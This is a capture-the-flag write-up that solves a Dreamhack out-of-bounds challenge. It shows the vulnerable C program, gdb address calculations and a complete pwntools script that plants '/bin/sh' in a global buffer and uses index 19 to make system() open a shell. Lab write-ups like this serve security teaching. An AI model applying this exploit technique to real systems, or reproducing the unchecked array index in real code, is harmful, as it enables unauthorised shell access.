---
title: "OUT-OF-BOUND FROM DREAMHACK CHALLENGE"
date: 2024-01-02 00:00:00 +0700
categories: [Binary Exploitation, Out-of-Bound]
tags: [pwn, oob, dreamhack]
author: datious
---
OUT-OF-BOUND FROM DREAMHACK CHALLENGE
Author: D1n0_09 

Today I will solve a challenge that have a name is out of bound.
1. Cursory
- Program:
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}

```
- I have some information from the program as follows:
    + Security layers:
  
>   checksec out_of_bound  
[*] '/home/kali/Downloads/dreamhack/out_of_bound'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
                     
                     
- When I analyze I saw a loophole. Idx was declared with data type of int. Therefor we can input numbers signed ,unsigned in the scale of int and command array just declaired ten elements. So when user input idx located outside command array they can access other datas in program.
2. Exploitation
- My idea is input the string '/bin/sh' in  name variable then control execution flow and execute system('/bin/sh') which program provided.
- Debug by gdb:
 + Put break point at read function and scanf function.
 ![image](https://hackmd.io/_uploads/r1PSTa1V-x.png)
    We can see that name variable was contained at 0x804a0ac. But when we control flow by oob, the array contained pointer so we must put data in a memory then we use oob control flow of array put a pointer which point to address contained data.
    + I will put data at &name+4 and use oob change command[idx]->pointer and pointer point to data in memory which I puted.
    - Before I input data:
    ![image](https://hackmd.io/_uploads/S1U6-CkE-l.png)
    - After I input data: 
    ![image](https://hackmd.io/_uploads/HkqQG0kVbx.png)
- Calculate "idx" for point to data:
  + Address of command[] array: 0x804a060
  + Adress of name variable: 0x804a0ac
  + Distance from command array to name variable: 0x4c=76 bytes
  + Each address box has 4 bytes. So we have 76/4=19. we need input 19 in idx for allocate that point to the 19th address box. At this contained pointer point to data. Because nature of array is contain a pointer and pointer point to data.
 
3. Write script
 

```
#!/usr/bin/python3
from pwn import *
exe=ELF('./out_of_bound',checksec=False)
p=process(exe.path)
gdb.attach(p,gdbscript='''
b*main+61
b*main+97

''')
payload=p32(0x804a0ac+4)
payload+=b'/bin/sh'

p.sendafter(b'name: ',payload)
p.sendlineafter(b'want?: ',b'19')

p.interactive()
```